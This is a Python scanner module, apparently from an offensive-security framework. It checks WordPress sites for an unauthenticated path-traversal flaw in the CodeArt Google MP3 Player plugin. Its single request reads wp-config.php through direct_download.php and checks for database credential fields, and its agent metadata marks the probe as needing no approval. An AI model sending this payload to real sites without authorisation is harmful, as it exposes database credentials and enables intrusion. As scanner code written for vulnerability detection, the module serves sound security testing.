#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated attacker to download file from server."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download Detection',
        'description': 'WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated attacker to download file from server.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'wp-plugin', 'wp', 'wordpress', 'lfi', 'google-mp3-audio-player', 'unauth', 'disclosure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/35460',
            'https://wordpress.org/plugins/google-mp3-audio-player/',
        ],
    }

    def run(self):
        path = '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../wp-config.php'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('DB_USER', 'DB_PASSWORD', 'DB_HOST',)
        header_any = ('application/octet-stream',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download detected', path=path)
            return True
        return False

